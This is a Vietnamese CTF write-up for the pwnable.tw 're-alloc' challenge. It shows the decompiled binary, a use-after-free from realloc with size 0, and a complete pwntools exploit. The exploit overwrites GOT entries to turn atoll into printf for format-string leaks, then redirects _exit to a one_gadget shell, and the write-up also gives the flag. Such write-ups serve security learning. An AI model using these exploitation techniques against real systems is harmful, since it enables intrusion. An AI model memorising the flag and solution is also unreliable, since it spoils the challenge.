# Re-alloc

- 1 chall rất hay giúp mình học được nhiều thứ 
- trước tiên thì ta cùng tìm hiểu realloc() hoạt động như thế nào 

## Realloc
- Hàm realloc được sử dụng để thay đổi kích thước của một vùng nhớ đã được cấp phát trước đó bằng malloc hoặc calloc. Nó nhận vào hai tham số: con trỏ đến vùng nhớ hiện tại và kích thước mới mà bạn muốn cấp phát. Hàm realloc sẽ thực hiện ba trường hợp chính

```c 
int* newPtr = (int*)realloc(ptr, 2 * sizeof(int));
```
- Nếu con trỏ là NULL, thì realloc tương đương với malloc
- Nếu kích thước mới là 0, thì realloc tương đương với free, giải phóng vùng nhớ hiện tại.
- Nếu kích thước mới lớn hơn 0, thì realloc sẽ cố gắng thay đổi kích thước của vùng nhớ hiện tại. Nếu có đủ vùng nhớ liên tiếp để mở rộng hoặc thu nhỏ, nó sẽ thực hiện thay đổi kích thước và trả về con trỏ mới. Nếu không đủ vùng nhớ liên tiếp, nó sẽ cấp phát một vùng nhớ mới, sao chép dữ liệu từ vùng nhớ cũ sang vùng nhớ mới và trả về con trỏ mới.

## Ida
- main

```c 
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 0;
  init_proc(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &v3);
      if ( v3 != 2 )
        break;
      reallocate();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        rfree();
      }
      else
      {
        if ( v3 == 4 )
          _exit(0);
LABEL_13:
        puts("Invalid Choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      allocate();
    }
  }
}
```

- menu 

```c 
int menu()
{
  puts("$$$$$$$$$$$$$$$$$$$$$$$$$$$$");
  puts(&byte_402070);
  puts("$$$$$$$$$$$$$$$$$$$$$$$$$$$$");
  puts("$   1. Alloc               $");
  puts("$   2. Realloc             $");
  puts("$   3. Free                $");
  puts("$   4. Exit                $");
  puts("$$$$$$$$$$$$$$$$$$$$$$$$$$$");
  return printf("Your choice: ");
}
```
- allocate

```c 
int allocate()
{
  _BYTE *v0; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-20h]
  unsigned __int64 size; // [rsp+8h] [rbp-18h]
  void *v4; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 || heap[v2] )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    printf("Size:");
    size = read_long();
    if ( size <= 0x78 )
    {
      v4 = realloc(0LL, size);
      if ( v4 )
      {
        heap[v2] = v4;
        printf("Data:");
        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (unsigned int)size));
        *v0 = 0;
      }
      else
      {
        LODWORD(v0) = puts("alloc error");
      }
    }
    else
    {
      LODWORD(v0) = puts("Too large!");
    }
  }
  return (int)v0;
}
```
- reallocate 

```c 
int reallocate()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-18h]
  unsigned __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v1 = read_long();
  if ( v1 > 1 || !heap[v1] )
    return puts("Invalid !");
  printf("Size:");
  size = read_long();
  if ( size > 0x78 )
    return puts("Too large!");
  v3 = realloc((void *)heap[v1], size);
  if ( !v3 )
    return puts("alloc error");
  heap[v1] = v3;
  printf("Data:");
  return read_input(heap[v1], (unsigned int)size);
}
```

- rfree

```c 
int rfree()
{
  _QWORD *v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    realloc((void *)heap[v2], 0LL);
    v0 = heap;
    heap[v2] = 0LL;
  }
  return (int)v0;
}
```

## Analysis
- nhìn sơ qua thì thấy cả chall đều dùng realloc
- tối đa chỉ tạo được 2 chunk 
- Bug nằm ở hàm reallocate khi ta có quyền nhập size cho realloc, nếu ta cho size = 0 thì chunk sẽ free mà ko xóa con trỏ đánh dấu => DBF và UAF
- nhưng vấn đề nhức nhối ở đây là ta hoàn toàn ko có hàm in data để leak libc hay hàm nào đó tạo shell => buộc ta phải tự tạo ra nó 
- để ý hàm read_long

```c 
__int64 read_long()
{
  char nptr[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  __read_chk(0LL, nptr, 16LL, 17LL);
  return atoll(nptr);
}
```
- atoll dữ liệu mình nhập vào, nếu đổi nó thành printf thì ta hoàn toàn có thể leak libc bằng FMT bug => tấn công GOT atoll thành printf

## Exploit
- ý tưởng đã có, giờ lợi dụng UAF của hàm reallocate để thay plt@atoll thành plt@printf 

```c 
add(0, 0x18, b'aaaa')
edit(0, 0 , b'')
edit(0, 0x18, p64(exe.got.atoll))
add(1, 0x18 , b'aaaa')
edit(1, 0x28, b'aaaa')
delete(1)
add(1, 0x18, p64(exe.plt.printf))
```

![image](https://github.com/gookoosss/CTF/assets/128712571/86c010d8-c748-4b4a-8be4-1b3989fe60fa)


- xong bước đầu r thì leak libc vs stack thoải mái thôi 

```c 
p.sendlineafter(b'choice: ', b'1')
p.sendlineafter(b'Index:', b'%23$p')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x26b6b
print(hex(libc.address))
p.sendlineafter(b'choice: ', b'1')
p.sendlineafter(b'Index:', b'%18$p')
stack = int(p.recvline()[:-1], 16)
print(hex(stack))
```

- có đầy đủ thứ ta cần rồi giờ tấn công GOT của thằng exit thành one_gadget là xong (đến đây rồi các bạn tự debug và ngẫm nha, cũng dễ hiểu thôi)

```c 
p.sendlineafter(b'choice: ', b'1')
payload  = f'%{exe.got._exit & 0xffff}c%18$hn'.encode()
p.sendlineafter(b'Index:', payload)
one_gadget = libc.address + 0xe2383
GDB()

for i in range(3):
    p.sendlineafter(b'choice: ', b'1')
    payload  = f'%{exe.got._exit + i * 2 & 0xffff}c%18$hn'.encode()
    p.sendlineafter(b'Index:', payload)
    p.sendlineafter(b'choice: ', b'1')
    payload  = f'%{one_gadget >> i * 16 & 0xffff}c%22$hn'.encode()
    p.sendlineafter(b'Index:', payload)

p.sendlineafter(b'choice: ', b'4')

p.interactive() 
```

- cuối cùng là lấy flag hehe 

![image](https://github.com/gookoosss/CTF/assets/128712571/9423d2b0-01f4-41a5-931a-5db02069a00f)

## script

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./re-alloc_patched")
libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
ld = ELF("./ld-2.29.so")

context.binary = exe

p = process([exe.path])

def GDB():
    gdb.attach(p, gdbscript = '''
    b*0x000000000040129d
    c
    ''')

    input()

p = remote('chall.pwnable.tw',10106)

def add(idx, size, data):
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'Index:', str(idx))
    p.sendlineafter(b'Size:', str(size))
    p.sendlineafter(b'Data:', data)

def edit(idx, size, data):
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'Index:', str(idx))
    p.sendlineafter(b'Size:', str(size))
    if size != 0:
        p.sendlineafter(b'Data:', data)

def delete(idx):
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'Index:', str(idx))

add(0, 0x18, b'aaaa')
edit(0, 0 , b'')
edit(0, 0x18, p64(exe.got.atoll))
add(1, 0x18 , b'aaaa')
edit(1, 0x28, b'aaaa')
delete(1)
add(1, 0x18, p64(exe.plt.printf))

p.sendlineafter(b'choice: ', b'1')
p.sendlineafter(b'Index:', b'%23$p')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x26b6b
print(hex(libc.address))
p.sendlineafter(b'choice: ', b'1')
p.sendlineafter(b'Index:', b'%18$p')
stack = int(p.recvline()[:-1], 16)
print(hex(stack))

p.sendlineafter(b'choice: ', b'1')
payload  = f'%{exe.got._exit & 0xffff}c%18$hn'.encode()
p.sendlineafter(b'Index:', payload)
one_gadget = libc.address + 0xe2383
# GDB()

for i in range(3):
    p.sendlineafter(b'choice: ', b'1')
    payload  = f'%{exe.got._exit + i * 2 & 0xffff}c%18$hn'.encode()
    p.sendlineafter(b'Index:', payload)
    p.sendlineafter(b'choice: ', b'1')
    payload  = f'%{one_gadget >> i * 16 & 0xffff}c%22$hn'.encode()
    p.sendlineafter(b'Index:', payload)

p.sendlineafter(b'choice: ', b'4')

p.interactive() 

# FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}
```

## Flag 

FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}
